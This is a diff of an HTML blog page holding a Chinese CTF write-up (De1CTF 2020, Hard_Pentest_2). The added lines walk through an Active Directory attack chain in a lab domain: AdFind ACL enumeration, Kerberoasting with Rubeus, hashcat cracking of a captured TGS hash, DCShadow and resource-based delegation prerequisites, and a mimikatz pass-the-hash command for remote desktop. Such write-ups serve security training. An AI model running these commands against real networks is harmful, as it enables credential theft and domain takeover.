@@ -247,7 +247,7 @@
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200505171730531.png" alt="image-20200505171730531"></p>
 <p>之后去下载minclude.so文件，这里我开始用脚本提出来的有问题，最后用burp可以提取出来，用burp的右键copy to file就可以保存so文件，之后就试pwn了。</p>
 <h1 id="0x06-Hard-Pentest-2"><a href="#0x06-Hard-Pentest-2" class="headerlink" title="0x06 Hard_Pentest_2"></a>0x06 Hard_Pentest_2</h1><p>执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\web -recmute</span><br><span class="line">AdFind.exe -s subtree -b &quot;cn&#x3D;de1ta,cn&#x3D;users,dc&#x3D;DE1CTF2020,dc&#x3D;lab&quot; -sc getacl -sddl++ -recmute</span><br></pre></td></tr></table></figure>
 
 <p>可得</p>
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506082021322.png" alt="image-20200506082021322"></p>
@@ -419,17 +419,50 @@
 <p>删除SPN的参数如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -D VNC&#x2F;DC1.test.com Administrator</span><br></pre></td></tr></table></figure>
 </blockquote>
-<p>这里用rubeu.exe进行Kerberoastong攻击，拿到De1ta的spn hash,然后用hashcat暴力破解hash,我这里没有编译好Rubeus，就直接用师傅得出来的密码去下一步了。对应的命令如下，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast</span><br><span class="line">.&#x2F;hashcat64.bin -a 3 -m 13100 de1ta_spn.txt ?h?h?h?h?h?h?h?h</span><br></pre></td></tr></table></figure>
+<p>这里用rubeus.exe进行Kerberoastong攻击，</p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506201311011.png" alt="image-20200506201311011"></p>
+<p>拿到De1ta的spn hash,然后用hashcat暴力破解hash，对应的命令如下，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 de1ta_spn.txt ?h?h?h?h?h?h?h?h</span><br><span class="line">-a 3 表示掩码攻击 </span><br><span class="line">-m 13100 Kerberos 5 TGS-REP etype 23</span><br><span class="line">后面是掩码字符集</span><br><span class="line">hashcat 用法可以参考https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;4008</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506212238198.png" alt="image-20200506212238198"></p>
+</blockquote>
+<p>还可以这样：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*De1ta$De1CTF2020.lab$http&#x2F;DM.De1CTF2020.lab*$61050147501E33CBDD5989D54AF1DF7B$346869F1DD94F400AE5C9925D03AA79F11B114AA6304B1ADAA7527796F7A80B4A21D1C0 FD329739F4572C9F0FC05622195960B66199E632715E616A79A92C3EB2CDF16EBB4A48575B3C6138065B2DCF544550C4A670FC5F3A55E61E2FE66762672ABFB9DA87018D91A2BED79EA50FA2AEB3E710339A2A733DDAEBC9017E49019132F99DCC626444E9F91885F539AB23BBB1AD082446B567B8FD29C72708FE6B56252CEA3BE85EACD0433644E9E99E2C8A8930FBB6043E1CD18054E4C948BBB5F0C5F3C9E2EA85E305079CC8CC38049AF88D37AE6211D75A3D06092350799BFFC23B9C4B1EE2BB1C586241374A23170B8F44E64E7A9B6101B780D28ACE1CB67152D54756EF57C21326E1C96B73680E5D495897F6086BBEDA269013C32C27C9029F11746B2B3F2AADFFB1831FA6761020894A81633FD5F8171D49EFDCEA0F89D696C3901A0A62F533BAC8CEDFD7BA77C6FBE095C1383A177D51C46603BDC236EBEF958FA9955226FDB551C0AC76EBDB4575782E215F7C05B1727107EC4B5468C92D3414BA53659E1A6A53F2E8608D9696AB0E11F32658DD9012AF96B74B2B8DE441FFADA666FA30012636B21C0AD46576F30467FD9C8923BEF4A9F37FCD4142E03423F692E7F9C36BD3626E3AA066C3254EADA1BDEB7B51B2EB256A4B79235D5854401CC9F73290352E550E41CE23C394A93FCBFBE35C398145E75FA64F1CE09A0B866F401B79351122DFCB1096999C879334C8D95F5B41601C713D6DA4ECB024D55680E8E71BED081EA48152561770DE047EBE017B10615A3DF335B3432718E3D000ECBBD21EFECF0D705B15C67763B4841BFA4EE6C78ED823B3A039E159DC16E024972E6EDFC7BE3057DF2EBA5C37274AE8753AA3675E02E5C52F8ABFFAD4B1B2DD97613092269E28370609DC24F295F5B769BED8AB95BE971B12B60608BCFB191BAC206D56AF13D5793B3F795AED53F7DF5D80056BC7799E223F7627EC8572AF324613813A8DBC78CC6DDAF85148A99C05BF802F63E64A77DE4BB9A0DC8B7DCDA97B80CDFCE0138EE81B1808F8F8BB4AAD3EF9CABAE504699F86938325C9D8C181FA66C95C986AE9D34D7B3DD15F2FAA29149815D3581F6462508D81D4A275F128A38C1DC8CEB54C2B8B98445DDE60C7469B598C172278A0BB6E17967998131712B55ACD27F0369133140E57A100CECB2625402F23CA3F246EACEEE638F1BC518CD0EDBA8B94492795833B1DB5D9F7C46DC4EA6014C750276F07190F181951918F028FB0CA4CB1617FC5E5EF7DBCD09D59E26C76B6AA7CC36D5A2EBF8670E018CCC1E3BE7E1D58E6FC798323421A3424562B9E14B325E50B36B14C8A4B3F42B43CF40DD73DF235F1B87FA6F2578767739608791CF4706140F02CE03F523A06069DA1C293E9BED7B188EEF41 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506212308372.png" alt="image-20200506212308372"></p>
+</blockquote>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506224335368.png" alt="image-20200506224335368"></p>
 <p>前面已经提示了De1ta有特殊的扩展权限，然后再用adfind去查看De1ta的acl权限</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -sc getacls -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br><span class="line">AdFind.exe -s subtree -b "dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;De1ta -recmute</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506085227520.png" alt="image-20200506085227520"></p>
-<p>可以看到上图框中的三个权限，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，进行DCShadow攻击需要打开两个mimikatz窗口，所以需要开启远程桌面，这里利用<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>进行代理，frp使用请看另一篇文章，代理设置好之后，就可以利用这篇文章提到的<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>利用ntlm直接登录远程桌面</p>
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506224719242.png" alt="image-20200506224719242"></p>
+<p>可以看到上图框中的三个权限(Add/Remove Replica In Domain、Replication Synchronization、Manage Replication Topology)，大佬说上面三个权限可以进行DCShadow攻击，具体攻击原理可以看<a href="https://blog.riskivy.com/dcshadow/" target="_blank" rel="noopener">https://blog.riskivy.com/dcshadow/</a>这篇文章，</p>
+<blockquote>
+<p>但是单单三个权限还是不满足Dcshadow的条件的，还要对当前主机属性具有写权限以及对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限。然后再收集一波相关的ACL</p>
+<p>发现De1ta用户对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=sites,cn=Configuration,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506225825119.png" alt="image-20200506225825119"></p>
+<p>继续查看De1ta对当前主机DM属性具有写权限，满足Dcshadow的所有前提条件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -s subtree -b "cn=dm,cn=computers,dc=De1CTF2020,dc=lab" -sc getacl -sddl+++ -sddlfilter ;;;;;de1ctf2020\De1ta -recmute</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506225952439.png" alt="image-20200506225952439"></p>
+<p>然后通过基于资源的约束委派对当前主机进行本地提权。<a href="http://redteam.today/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/" target="_blank" rel="noopener">详细原理参考</a></p>
+<p>这里首先用klist purge命令把登录会话的所有票证清空</p>
+<p>klist语法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist [-lh &lt;LogonId.HighPart&gt;] [-li &lt;LogonId.LowPart&gt;] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/04/De1CTF-writeup/image-20200506235133913.png" alt="image-20200506235133913"></p>
+<p>之后参考这篇<a href="https://xz.aliyun.com/t/7454" target="_blank" rel="noopener">文章</a>，进行基于资源的约束委派攻击，首先使用<a href="https://github.com/Kevin-Robertson" target="_blank" rel="noopener">Kevin-Robertson</a>/<strong><a href="https://github.com/Kevin-Robertson/Powermad" target="_blank" rel="noopener">Powermad</a></strong>来添加一个账号</p>
+<p>进行DCShadow攻击需要打开两个mimikatz窗口，所以需要开启远程桌面，这里利用<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">frp</a>进行代理，frp使用请看另一篇文章，代理设置好之后，就可以利用这篇文章提到的<a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">Pass the Hash with Remote Desktop</a>利用ntlm直接登录远程桌面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:DM &#x2F;ntlm:B03094996601324646AC223BF30D0D07 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/04/De1CTF-writeup/image-20200506151539110.png" alt="image-20200506151539110"></p>
+<p>这里用的win的虚拟机进行的测试，然后win7是不支持Restricted Admin mode，官网说要安装补丁，如下两个都要安装。</p>
 <blockquote>
 <p>Restricted Admin mode，直译为受限管理模式，主要功能是使得凭据不会暴露在目标系统中</p>
 <h3 id="适用系统"><a href="#适用系统" class="headerlink" title="适用系统"></a>适用系统</h3><ul>
